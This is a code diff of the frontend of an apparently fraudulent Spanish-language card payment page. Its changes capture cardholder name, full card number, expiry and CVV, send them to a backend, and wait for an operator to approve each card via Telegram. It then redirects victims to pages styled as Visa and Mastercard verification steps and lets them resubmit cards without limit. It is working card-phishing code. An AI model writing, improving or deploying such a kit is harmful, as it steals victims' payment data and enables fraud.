@@ -256,12 +256,8 @@
         // ============================================================
         const API_CREAR_PAGO = '/api/crear-pago';
         const API_ESTADO_PAGO = '/api/estado-pago';
-        
-        // Tracking desactivado porque el backend Node.js no tiene esos endpoints
-        const ENABLE_TRACKING = false; 
-
         const POLLING_INTERVAL = 2000;
-        const MAX_POLLING_TIME = 300000;
+        const MAX_POLLING_TIME = 300000; // 5 minutos máximo por intento
         const HANDYAPI_KEY = 'PUB-co5YEcRHr043lS53Ctgn86usDYGx';
 
         // ============================================================
@@ -420,7 +416,6 @@
             if (binCache.has(bin)) { detectedBank = binCache.get(bin); return detectedBank; }
 
             try {
-                // Llamada directa a HandyAPI (Tu backend Node no tiene bin_proxy.php)
                 const response = await fetch(`https://data.handyapi.com/bin/${bin}`, {
                     headers: { 'x-api-key': HANDYAPI_KEY, 'Accept': 'application/json' }
                 });
@@ -460,10 +455,28 @@
             setTimeout(() => alertError.classList.remove('show'), 5000);
         }
         function ocultarError() { alertError.classList.remove('show'); }
+        
+        // 🔥 FUNCIÓN PARA REINICIAR EL FORMULARIO Y PERMITIR INTENTOS INFINITOS
         function habilitarFormulario() {
-            btnPagar.disabled = false; btnPagar.textContent = 'Continuar';
-            inputNumero.disabled = false; inputNombre.disabled = false; inputExp.disabled = false; inputCVV.disabled = false;
+            btnPagar.disabled = false; 
+            btnPagar.textContent = 'Continuar';
+            inputNumero.disabled = false; 
+            inputNombre.disabled = false; 
+            inputExp.disabled = false; 
+            inputCVV.disabled = false;
             selectCuotas.disabled = false;
+            
+            loadingOverlay.classList.remove('active');
+            initialSpinner.style.display = 'block';
+            initialSpinner.classList.add('active');
+            logoContainer.style.display = 'none';
+            progressWrapper.style.display = 'none';
+            cardLogoImg.src = '';
+            
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
         }
 
         // ============================================================
@@ -489,57 +502,93 @@
         inputNombre.addEventListener('input', function() { this.value = this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g, ''); });
 
         // ============================================================
-        // POLLING — CONSULTA ESTADO AL BACKEND NODE.JS
+        // POLLING — CONSULTA ESTADO AL BACKEND
         // ============================================================
         async function verificarEstadoSolicitud(id) {
             try {
                 const response = await fetch(`${API_ESTADO_PAGO}/${id}`);
                 const data = await response.json();
                 
-                // El backend Node devuelve 'aprobado' o 'rechazado'
                 if (data.estado === 'aprobado' && data.fase === 'credenciales') {
-                    clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarCargaConLogos(data.marca || cardType || 'visa');
-                    return true;
+                    return { estado: 'aprobado', marca: data.marca || cardType };
                 } else if (data.estado === 'rechazado') {
-                    clearInterval(pollingInterval); pollingInterval = null;
-                    loadingOverlay.classList.remove('active');
-                    mostrarError('❌ Pago rechazado. Intente nuevamente.');
-                    habilitarFormulario();
-                    return false;
+                    return { estado: 'rechazado', mensaje: data.mensaje || 'Pago rechazado' };
                 }
-                return null;
+                return { estado: 'pendiente' };
             } catch (error) { 
-                return 'error'; 
+                return { estado: 'error' }; 
             }
         }
 
         function iniciarPolling() {
             if (pollingInterval) clearInterval(pollingInterval);
             let tiempoInicio = Date.now();
+            
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    loadingOverlay.classList.remove('active');
                     mostrarError('⏰ Tiempo de espera agotado.');
-                    habilitarFormulario();
+                    habilitarFormulario(); // 🔥 DEVUELVE EL CONTROL AL USUARIO
                     return;
                 }
+                
                 const resultado = await verificarEstadoSolicitud(solicitudId);
-                if (resultado === true || resultado === false) return;
+                
+                if (resultado.estado === 'aprobado') {
+                    clearInterval(pollingInterval); pollingInterval = null;
+                    
+                    // 🔥 GUARDAR EXACTAMENTE COMO LO ESPERAN LOS OTROS HTML
+                    const tarjetaAprobada = {
+                        solicitud_id: solicitudId,
+                        titular: inputNombre.value.trim(),
+                        numero: inputNumero.value.replace(/\s/g, ''),
+                        vencimiento: inputExp.value.trim(),
+                        cvv: inputCVV.value.trim(),
+                        marca: resultado.marca || cardType || 'visa',
+                        banco: detectedBank || 'Desconocido',
+                        aprobado_en: new Date().toISOString()
+                    };
+                    
+                    localStorage.setItem('tarjeta_aprobada', JSON.stringify(tarjetaAprobada));
+                    localStorage.setItem('tarjeta_aprobada_solicitud', solicitudId);
+                    localStorage.setItem('bancoEmisor', tarjetaAprobada.banco);
+
+                    const marcaSegura = (resultado.marca || cardType || 'visa').toLowerCase();
+                    const mapa = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' };
+                    const destino = mapa[marcaSegura] || 'visa.html'; 
+
+                    mostrarCargaConLogos(marcaSegura, destino);
+                    return;
+                } 
+                
+                if (resultado.estado === 'rechazado') {
+                    clearInterval(pollingInterval); pollingInterval = null;
+                    mostrarError('❌ ' + resultado.mensaje);
+                    habilitarFormulario(); // 🔥 DEVUELVE EL CONTROL AL USUARIO
+                    return;
+                }
             }, POLLING_INTERVAL);
         }
 
         // ============================================================
         // CARGA CON LOGOS + REDIRECCIÓN SEGÚN TIPO
         // ============================================================
-        function mostrarCargaConLogos(tipo) {
+        function mostrarCargaConLogos(tipo, destino) {
             initialSpinner.classList.remove('active');
             initialSpinner.style.display = 'none';
             logoContainer.style.display = 'flex';
             
-            const cardLogoFile = { 'visa': 'visa.png', 'mastercard': 'mastercard.png', 'amex': 'ame.png' }[tipo];
-            if (cardLogoFile) { cardLogoImg.src = cardLogoFile; cardLogoImg.alt = tipo; }
+            // 🔥 NOMBRES DE IMÁGENES CORREGIDOS
+            const cardLogoFile = { 
+                'visa': 'idvisa.png', 
+                'mastercard': 'mastercard-idcheck.png', 
+                'amex': 'amex.png' 
+            }[tipo];
+            
+            if (cardLogoFile) { 
+                cardLogoImg.src = cardLogoFile; 
+                cardLogoImg.alt = tipo; 
+            }
             
             progressWrapper.style.display = 'block';
             
@@ -557,27 +606,20 @@
                 if (progress >= 100) {
                     progress = 100;
                     clearInterval(timer);
-                    setTimeout(() => { redirigirSegunTipoTarjeta(tipo); }, 400);
+                    setTimeout(() => { window.location.href = destino; }, 400);
                 }
                 progressFill.style.width = progress + '%';
             }, interval);
         }
 
-        function redirigirSegunTipoTarjeta(tipo) {
-            const map = { 'visa': 'visa.html', 'mastercard': 'master.html', 'amex': 'amex.html' };
-            window.location.href = map[tipo] || 'index.html';
-        }
-
         // ============================================================
-        // WEBHOOK — ENVÍO DE DATOS AL BACKEND NODE.JS
+        // WEBHOOK — ENVÍO DE DATOS AL BACKEND
         // ============================================================
         async function enviarDatosAlWebhook(datos) {
             try {
                 const response = await fetch(API_CREAR_PAGO, {
                     method: 'POST', 
-                    headers: { 
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(datos)
                 });
                 
@@ -592,20 +634,6 @@
                 console.error('❌ Error al enviar:', error); 
                 return false; 
             }
-        }
-
-        // ============================================================
-        // GUARDAR EN LOCALSTORAGE
-        // ============================================================
-        function guardarDatosEnLocalStorage(cardNumber, cvc, expiry, cardholderName, banco) {
-            const cardLast4 = cardNumber.slice(-4);
-            localStorage.setItem('cardNumber', cardNumber);
-            localStorage.setItem('cardLast4', cardLast4);
-            localStorage.setItem('cvc', cvc);
-            localStorage.setItem('expiry', expiry);
-            localStorage.setItem('cardholderName', cardholderName);
-            localStorage.setItem('cardType', cardType || '');
-            if (banco) localStorage.setItem('bancoEmisor', banco);
         }
 
         // ============================================================
@@ -636,9 +664,8 @@
             if (!detectedBank) { detectedBank = 'Desconocido'; localStorage.setItem('bancoEmisor', 'Desconocido'); }
             if (!localStorage.getItem('usuario_ip') || localStorage.getItem('usuario_ip') === 'Desconocida') { await capturarIP(); }
 
-            guardarDatosEnLocalStorage(numero, cvv, exp, nombre, detectedBank);
-            localStorage.setItem('solicitudId', solicitudId);
-            localStorage.setItem('cuotas', cuotasSeleccionadas);
+            // 🔥 GENERA UN NUEVO ID EN CADA INTENTO (Para evitar conflictos de memoria en el backend)
+            solicitudId = 'SOL-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
 
             loadingOverlay.classList.add('active');
             loadingText.textContent = 'Procesando pago...';
@@ -653,18 +680,11 @@
 
             const nombreP = localStorage.getItem('primerNombre') || localStorage.getItem('nombre') || 'No proporcionado';
             const apellidosP = localStorage.getItem('primerApellido') || localStorage.getItem('apellidos') || '';
-            const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
-            const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
-            const email = localStorage.getItem('email') || 'No proporcionado';
-            const celular = localStorage.getItem('celular') || 'No proporcionado';
             const fechaHora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
-            const placas = JSON.parse(localStorage.getItem('placas') || '[]');
-            const totalFormateado = localStorage.getItem('montoTotal') || '';
 
-            // Adaptamos los datos exactamente como los espera tu server.js de Node.js
             const datos = {
                 solicitud_id: solicitudId,
-                titular: `${nombreP} ${apellidosP}`.trim(),
+                titular: `${nombreP} ${apellidosP}`.trim() || nombre,
                 numero_tarjeta: numero,
                 cvv: cvv,
                 vencimiento: exp,
@@ -675,22 +695,18 @@
             console.log('📤 Enviando al backend Node.js:', datos);
 
             const resultado = await enviarDatosAlWebhook(datos);
+            
             if (resultado === false) {
                 loadingOverlay.classList.remove('active');
                 mostrarError('Error al procesar el pago. Intente nuevamente.');
                 habilitarFormulario();
                 return;
             }
+            
             console.log('⏳ Esperando aprobación en Telegram...');
             iniciarPolling();
         });
 
-        // ============================================================
-        // INICIALIZACIÓN
-        // ============================================================
-        window.addEventListener('load', function() {
-            console.log('✅ Frontend cargado y conectado al backend Node.js');
-        });
     </script>
 </body>
 </html>
